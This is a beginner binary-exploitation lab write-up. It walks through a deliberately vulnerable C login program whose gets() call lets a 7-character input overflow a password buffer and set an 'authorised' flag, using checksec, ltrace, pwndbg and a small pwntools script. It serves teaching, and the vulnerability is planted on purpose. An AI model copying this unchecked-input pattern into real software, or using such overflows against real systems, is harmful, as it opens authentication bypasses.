# Stack Variable Overwrite

---
## Source Code
```c
// vuln.c
#include <stdio.h>
#include <string.h>

int main(void)
{
    char password[6];
    int authorised = 0;

    printf("Enter admin password: \n");
    gets(password);

    if(strcmp(password, "pass") == 0)
    {
        printf("Correct Password!\n");
        authorised = 1;
    }
    else
    {
        printf("Incorrect Password!\n");
    }

    if(authorised)
    {
        printf("Successfully logged in as Admin (authorised=%d) :)\n", authorised);
    }else{
		printf("Failed to log in as Admin (authorised=%d) :(\n", authorised);
	}

    return 0;
}
```

---

## Compile
```bash
gcc vuln.c -o vuln -fno-stack-protector -z execstack -no-pie -m32
```

#### Output
```text
vuln.c: In function ‘main’:
vuln.c:11:5: warning: implicit declaration of function ‘gets’; did you mean ‘fgets’? [-Wimplicit-function-declaration]
   11 |     gets(password);
      |     ^~~~
      |     fgets
/usr/bin/ld: /tmp/ccZwi67X.o: in function `main':
vuln.c:(.text+0x3e): warning: the `gets' function is dangerous and should not be used.
```

### Compile Information
```bash
checksec vuln
```

#### Output
```text
[*] '/home/s/Binary-Exploitation-Notes/001_Overwriting_Stack_Variable_Part_1/vuln'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x8048000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
```

### Short Explaination

1. `Stack: No canary found` is based on the command `-fno-stack-protector`, which is disable the security mechanism to detect stake overflow.
2. `NX: NX unknown - GNU_STACK missing` is based on the command `-z execstack`, which is doesn't marks certain area of memory as non-executable.
3. `PIE: No PIE (0x8048000)` is based on the command `-no-pie`, which is not load in the memory randomly, but follow the memory address `(0x8048000)`.

---

## Program Investigate

### Run
```bash
./vuln
```

#### Output
```text
Enter admin password:
aaaaaa
Incorrect Password!
Failed to log in as Admin (authorised=0) :(
```

Based on the output, the program need user to enter the admininistrator password. The user try using **"aaaaaa"**, and the password is error. Now, try with a tools called **"ltrace"** to identify what going on for the program while running.

### Run with ltrace
```bash
ltrace ./vuln
```

#### Output
```text
__libc_start_main(0x80491a6, 1, 0xffc99424, 0 <unfinished ...>
puts("Enter admin password: "Enter admin password:
)                                            = 23
gets(0xffc99346, 0xf7f71f90, 0xf7d314be, 0x80491bdtest
)                       = 0xffc99346
strcmp("test", "pass")                                                    = 1
puts("Incorrect Password!"Incorrect Password!
)                                               = 20
printf("Failed to log in as Admin (autho"..., 0Failed to log in as Admin (authorised=0) :(
)                          = 44
+++ exited (status 0) +++
```

Based on the output of `ltrace`, the program is compare the **"test"** strings with **"pass"**, if incorrect then print **"Incorrect Password!"** and **"Failed to log in as Admin (authorised=0) :("**.

### Run with ltrace Again (Output)
```
__libc_start_main(0x80491a6, 1, 0xffa8c2c4, 0 <unfinished ...>
puts("Enter admin password: "Enter admin password:
)                                            = 23
gets(0xffa8c1e6, 0xf7f53f90, 0xf7d134be, 0x80491bdpass
)                       = 0xffa8c1e6
strcmp("pass", "pass")                                                    = 0
puts("Correct Password!"Correct Password!
)                                                 = 18
printf("Successfully logged in as Admin "..., 1Successfully logged in as Admin (authorised=1) :)
)                          = 50
+++ exited (status 0) +++
```

Now based on the output of `ltrace`, the program is compare the **"pass"** strings with **"pass"**, it will print **"Correct Password!"** and **"Successfully logged in as Admin (authorised=1) :)"**.

## Buffer Overflow
```bash
./vuln
```

### Output
```
Enter admin password:
AAAAAAA
Incorrect Password!
Successfully logged in as Admin (authorised=65) :)
```

After we flow the **7** character **"A"** to the program, even the password is wrong but it still success to login as a Admin, and the `authorised` variable is overwrite to the ASCII character **"A"** code, which is represent in Decimal form.

## Code Analyzing
```c
#include <stdio.h>
#include <string.h>

int main(void)
{
    char password[6];
    int authorised = 0;

    printf("Enter admin password: \n");
    gets(password);
```

The `gets()` function is the vulnerability, because it doesn't check the size of getting string to pass to the variable, `password` which only have 6 bytes capability. If the size of input strings is over 6 bytes, it will overflow to next stack, which is `authorised` because of the `authorised` is declare after the `password` in the stack.

## Ghidra Program Analysis
![image](https://github.com/user-attachments/assets/c3c9006c-017f-44f8-a873-bbd77e948403)

## GDB-PWN Analysis
```bash
gdb vuln
```

### Show The Function List
```bash
pwngdb> info functions
```

#### Output
```text
pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x08049000  _init
0x08049040  strcmp@plt
0x08049050  __libc_start_main@plt
0x08049060  printf@plt
0x08049070  gets@plt
0x08049080  puts@plt
0x08049090  _start
0x080490d0  _dl_relocate_static_pie
0x080490e0  __x86.get_pc_thunk.bx
0x080490f0  deregister_tm_clones
0x08049130  register_tm_clones
0x08049170  __do_global_dtors_aux
0x080491a0  frame_dummy
0x080491a6  main
0x08049274  _fini
pwndbg>
```

### Disassemble Main()
```bash
pwndbg> disassemble main
```

#### Output
```text
Dump of assembler code for function main:
   0x080491a6 <+0>:     lea    ecx,[esp+0x4]
   0x080491aa <+4>:     and    esp,0xfffffff0
   0x080491ad <+7>:     push   DWORD PTR [ecx-0x4]
   0x080491b0 <+10>:    push   ebp
   0x080491b1 <+11>:    mov    ebp,esp
   0x080491b3 <+13>:    push   ebx
   0x080491b4 <+14>:    push   ecx
   0x080491b5 <+15>:    sub    esp,0x10
   0x080491b8 <+18>:    call   0x80490e0 <__x86.get_pc_thunk.bx>
   0x080491bd <+23>:    add    ebx,0x2e43
   0x080491c3 <+29>:    mov    DWORD PTR [ebp-0xc],0x0
   0x080491ca <+36>:    sub    esp,0xc
   0x080491cd <+39>:    lea    eax,[ebx-0x1ff8]
   0x080491d3 <+45>:    push   eax
   0x080491d4 <+46>:    call   0x8049080 <puts@plt>
   0x080491d9 <+51>:    add    esp,0x10
   0x080491dc <+54>:    sub    esp,0xc
   0x080491df <+57>:    lea    eax,[ebp-0x12]
   0x080491e2 <+60>:    push   eax
   0x080491e3 <+61>:    call   0x8049070 <gets@plt>
   0x080491e8 <+66>:    add    esp,0x10
   0x080491eb <+69>:    sub    esp,0x8
   0x080491ee <+72>:    lea    eax,[ebx-0x1fe1]
   0x080491f4 <+78>:    push   eax
   0x080491f5 <+79>:    lea    eax,[ebp-0x12]
   0x080491f8 <+82>:    push   eax
   0x080491f9 <+83>:    call   0x8049040 <strcmp@plt>
   0x080491fe <+88>:    add    esp,0x10
   0x08049201 <+91>:    test   eax,eax
   0x08049203 <+93>:    jne    0x8049220 <main+122>
   0x08049205 <+95>:    sub    esp,0xc
   0x08049208 <+98>:    lea    eax,[ebx-0x1fdc]
   0x0804920e <+104>:   push   eax
   0x0804920f <+105>:   call   0x8049080 <puts@plt>
   0x08049214 <+110>:   add    esp,0x10
   0x08049217 <+113>:   mov    DWORD PTR [ebp-0xc],0x1
   0x0804921e <+120>:   jmp    0x8049232 <main+140>
   0x08049220 <+122>:   sub    esp,0xc
   0x08049223 <+125>:   lea    eax,[ebx-0x1fca]
   0x08049229 <+131>:   push   eax
   0x0804922a <+132>:   call   0x8049080 <puts@plt>
   0x0804922f <+137>:   add    esp,0x10
   0x08049232 <+140>:   cmp    DWORD PTR [ebp-0xc],0x0
   0x08049236 <+144>:   je     0x804924f <main+169>
   0x08049238 <+146>:   sub    esp,0x8
   0x0804923b <+149>:   push   DWORD PTR [ebp-0xc]
   0x0804923e <+152>:   lea    eax,[ebx-0x1fb4]
   0x08049244 <+158>:   push   eax
   0x08049245 <+159>:   call   0x8049060 <printf@plt>
   0x0804924a <+164>:   add    esp,0x10
   0x0804924d <+167>:   jmp    0x8049264 <main+190>
   0x0804924f <+169>:   sub    esp,0x8
   0x08049252 <+172>:   push   DWORD PTR [ebp-0xc]
   0x08049255 <+175>:   lea    eax,[ebx-0x1f80]
   0x0804925b <+181>:   push   eax
   0x0804925c <+182>:   call   0x8049060 <printf@plt>
   0x08049261 <+187>:   add    esp,0x10
   0x08049264 <+190>:   mov    eax,0x0
   0x08049269 <+195>:   lea    esp,[ebp-0x8]
   0x0804926c <+198>:   pop    ecx
   0x0804926d <+199>:   pop    ebx
   0x0804926e <+200>:   pop    ebp
   0x0804926f <+201>:   lea    esp,[ecx-0x4]
   0x08049272 <+204>:   ret
End of assembler dump.
```

## Check Comparision in 0x08049232 <+140>

### Set Breakpoint
```bash
pwndbg> break *main+140
```

#### Output
```text
Breakpoint 1 at 0x8049232
```

### Run
```bash
pwndbg> run
```

#### Output
```text
Starting program: /home/s/Binary-Exploitation-Notes/001_Overwriting_Stack_Variable_Part_1/vuln
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Enter admin password:
test
Incorrect Password!

Breakpoint 1, 0x08049232 in main ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
─────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────
 EAX  0x14
 EBX  0x804c000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x804bf14 (_DYNAMIC) ◂— 1
 ECX  0xf7fa99b4 (_IO_stdfile_1_lock) ◂— 0
 EDX  1
 EDI  0xf7ffcb80 (_rtld_global_ro) ◂— 0
 ESI  0xffffcd64 —▸ 0xffffceb8 ◂— '/home/s/Binary-Exploitation-Notes/001_Overwriting_Stack_Variable_Part_1/vuln'
 EBP  0xffffcc98 —▸ 0xf7ffd020 (_rtld_global) —▸ 0xf7ffda40 ◂— 0
 ESP  0xffffcc80 —▸ 0xffffccc0 —▸ 0xf7fa8000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x229dac
 EIP  0x8049232 (main+140) ◂— cmp dword ptr [ebp - 0xc], 0
───────────────────────────────────────────[ DISASM / i386 / set emulate on ]───────────────────────────────────────────
 ► 0x8049232 <main+140>    cmp    dword ptr [ebp - 0xc], 0     0 - 0     EFLAGS => 0x246 [ cf PF af ZF sf IF df of ]
   0x8049236 <main+144>  ✔ je     main+169                    <main+169>
    ↓
   0x804924f <main+169>    sub    esp, 8                    ESP => 0xffffcc78 (0xffffcc80 - 0x8)
   0x8049252 <main+172>    push   dword ptr [ebp - 0xc]
   0x8049255 <main+175>    lea    eax, [ebx - 0x1f80]       EAX => 0x804a080 ◂— 'Failed to log in as Admin (authorised=%d) :(\n'
   0x804925b <main+181>    push   eax
   0x804925c <main+182>    call   printf@plt                  <printf@plt>

   0x8049261 <main+187>    add    esp, 0x10
   0x8049264 <main+190>    mov    eax, 0                    EAX => 0
   0x8049269 <main+195>    lea    esp, [ebp - 8]
   0x804926c <main+198>    pop    ecx
───────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────
00:0000│ esp 0xffffcc80 —▸ 0xffffccc0 —▸ 0xf7fa8000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x229dac
01:0004│-014 0xffffcc84 ◂— 0x6574e66c
02:0008│-010 0xffffcc88 ◂— 0xf7007473 /* 'st' */
03:000c│-00c 0xffffcc8c ◂— 0
04:0010│-008 0xffffcc90 —▸ 0xffffccb0 ◂— 1
05:0014│-004 0xffffcc94 —▸ 0xf7fa8000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x229dac
06:0018│ ebp 0xffffcc98 —▸ 0xf7ffd020 (_rtld_global) —▸ 0xf7ffda40 ◂— 0
07:001c│+004 0xffffcc9c —▸ 0xf7d9f519 (__libc_start_call_main+121) ◂— add esp, 0x10
─────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────
 ► 0 0x8049232 main+140
   1 0xf7d9f519 __libc_start_call_main+121
   2 0xf7d9f5f3 __libc_start_main+147
   3 0x80490bc _start+44
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg>
```

### Show Result of [ebp - 0xc]
```bash
pwndbg> x $ebp - 0xc
```

#### Output
```text
0xffffcc8c:     0x00000000
```

### Modify Result of [ebp - 0xc]
```bash
pwndbg> set *0xffffcc8c = 1
```

#### Result
```bash
pwndbg> set *0xffffcc8c = 1
pwndbg> x $ebp - 0xc
0xffffcc8c:     0x00000001
```

### Continue and Get Authorized Access
```bash
pwndbg> c
```

#### Output
```text
Continuing.
Successfully logged in as Admin (authorised=1) :)
[Inferior 1 (process 25666) exited normally]
```

### Buffer Overflow
```bash
pwndbg> r
Starting program: /home/sheng/Binary-Exploitation-Notes/001_Overwriting_Stack_Variable_Part_1/vuln
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Enter admin password:
AAAAAAA
Incorrect Password!

Breakpoint 1, 0x08049232 in main ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
─────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────
 EAX  0x14
 EBX  0x804c000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x804bf14 (_DYNAMIC) ◂— 1
 ECX  0xf7fa99b4 (_IO_stdfile_1_lock) ◂— 0
 EDX  1
 EDI  0xf7ffcb80 (_rtld_global_ro) ◂— 0
 ESI  0xffffcd64 —▸ 0xffffceb8 ◂— '/home/sheng/Binary-Exploitation-Notes/001_Overwriting_Stack_Variable_Part_1/vuln'
 EBP  0xffffcc98 —▸ 0xf7ffd020 (_rtld_global) —▸ 0xf7ffda40 ◂— 0
 ESP  0xffffcc80 —▸ 0xffffccc0 —▸ 0xf7fa8000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x229dac
 EIP  0x8049232 (main+140) ◂— cmp dword ptr [ebp - 0xc], 0
───────────────────────────────────────────[ DISASM / i386 / set emulate on ]───────────────────────────────────────────
 ► 0x8049232 <main+140>    cmp    dword ptr [ebp - 0xc], 0     0x41 - 0x0     EFLAGS => 0x206 [ cf PF af zf sf IF df of ]
   0x8049236 <main+144>    je     main+169                    <main+169>

   0x8049238 <main+146>    sub    esp, 8                    ESP => 0xffffcc78 (0xffffcc80 - 0x8)
   0x804923b <main+149>    push   dword ptr [ebp - 0xc]
   0x804923e <main+152>    lea    eax, [ebx - 0x1fb4]       EAX => 0x804a04c ◂— 'Successfully logged in as Admin (authorised=%d) :)...'
   0x8049244 <main+158>    push   eax
   0x8049245 <main+159>    call   printf@plt                  <printf@plt>

   0x804924a <main+164>    add    esp, 0x10
   0x804924d <main+167>    jmp    main+190                    <main+190>
    ↓
   0x8049264 <main+190>    mov    eax, 0                    EAX => 0
   0x8049269 <main+195>    lea    esp, [ebp - 8]
───────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────
00:0000│ esp 0xffffcc80 —▸ 0xffffccc0 —▸ 0xf7fa8000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x229dac
01:0004│-014 0xffffcc84 ◂— 0x4141e66c
02:0008│-010 0xffffcc88 ◂— 'AAAAA'
03:000c│-00c 0xffffcc8c ◂— 0x41 /* 'A' */
04:0010│-008 0xffffcc90 —▸ 0xffffccb0 ◂— 1
05:0014│-004 0xffffcc94 —▸ 0xf7fa8000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x229dac
06:0018│ ebp 0xffffcc98 —▸ 0xf7ffd020 (_rtld_global) —▸ 0xf7ffda40 ◂— 0
07:001c│+004 0xffffcc9c —▸ 0xf7d9f519 (__libc_start_call_main+121) ◂— add esp, 0x10
─────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────
 ► 0 0x8049232 main+140
   1 0xf7d9f519 __libc_start_call_main+121
   2 0xf7d9f5f3 __libc_start_main+147
   3 0x80490bc _start+44
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg>
```

### Show Result of [ebp - 0xc]
```bash
pwndbg> x $ebp - 0xc
```

#### Output
```text
0xffffcc8c:     0x00000041
```

### Show Value 1 ($1)
```bash
pwndbg> p *0xffffcc8c
```

#### Output
```text
pwndbg> $1 = 65
```

### Show 4 Set of Base Pointer Result 
```bash
pwndbg> x/4x $ebp
```

#### Output
```text
0xffffcc98:     0xf7ffd020      0xf7d9f519      0xffffceb8      0x00000070
```

### Pwn Tools
```python
from pwn import *

# Start Program
io = process('./vuln')

# Send String to Overflow Buffer
io.sendlineafter(b':', b'AAAAAAA')

# Receive Output
print(io.recvall().decode())
```
